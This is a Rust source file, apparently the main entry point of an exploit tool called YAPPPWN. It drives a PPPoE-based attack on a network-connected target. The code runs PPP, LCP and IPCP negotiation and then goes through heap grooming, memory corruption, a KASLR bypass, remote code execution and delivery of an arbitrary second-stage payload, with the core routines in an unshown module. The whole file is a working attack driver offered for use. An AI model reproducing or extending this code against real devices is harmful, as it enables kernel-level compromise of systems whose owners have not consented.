mod constants;
mod exploit;
mod parser;

use exploit::{Exploit, LcpEchoHandler};
use parser::{get_args, Args};
use pnet::datalink::{self, NetworkInterface};

use std::fs::File;
use std::io::{self, Read};

fn read_stage(file_path: &str) -> io::Result<Vec<u8>> {
    let mut file = File::open(file_path)?;
    let mut buffer = Vec::new();
    file.read_to_end(&mut buffer)?;
    Ok(buffer) // Return the buffer
}

fn run_exploit(interface_name: String, stage1_path: String, stage2_path: String) {
    // Find interface
    let interface_names_match = |iface: &NetworkInterface| iface.name == interface_name;
    // Find the network interface with the provided name
    let interfaces = datalink::interfaces();
    let interface = interfaces.into_iter().find(interface_names_match).unwrap();

    // Load binaries of the two pyaloads
    let stage1 = read_stage(&stage1_path);
    let stage2 = read_stage(&stage2_path);

    // Exploit
    let mut expl = Exploit {
        source_mac: [0, 0, 0, 0, 0, 0],
        target_mac: [0, 0, 0, 0, 0, 0],
        pppoe_softc: 0,
        host_uniq: [0, 0, 0, 0, 0, 0, 0, 0],
        target_ipv6: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],
        source_ipv6: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],
        kaslr_offset: 0,
    };
    // LCP
    let mut handler = exploit::LcpEchoHandler::new(&interface);
    handler.start();
    // Initial negotiations
    println!("[*] Starting Negotiations ...");
    expl.ignore_first_padi(&interface);
    expl.ppp_negotiation(&interface, Some(expl.get_fake_ifnet()));
    expl.lcp_negotiation(&interface);
    expl.ipcp_negotiation(&interface);
    println!("[+] Initial Negotiations Done... Wait for interface to be ready");
    println!("[+] Starting Heap Grooming...");
    expl.heap_grooming(&interface);
    println!("[+] STAGE 1: Memory corruption");
    expl.memory_corruption(&interface);
    println!("[+] STAGE 2: KASLR defeat");
    expl.defeat_kaslr(&interface);
    println!("[+] STAGE 3: Remote code execution");
    expl.remote_code_exec(&interface, stage1.unwrap());
    expl.ppp_negotiation(&interface, None);
    expl.lcp_negotiation(&interface);
    expl.ipcp_negotiation(&interface);
    println!("[+] STAGE 4: Arbitrary payload execution");
    expl.frag_and_send(&interface, stage2.unwrap());
    println!("[+] DONE!");
    handler.stop();
}

fn main() {
    println!();
    println!("[+] YAPPPWN [+]");
    let args: Args = get_args();
    println!("{}", args);
    run_exploit(args.interface, args.stage_1, args.stage_2)
}
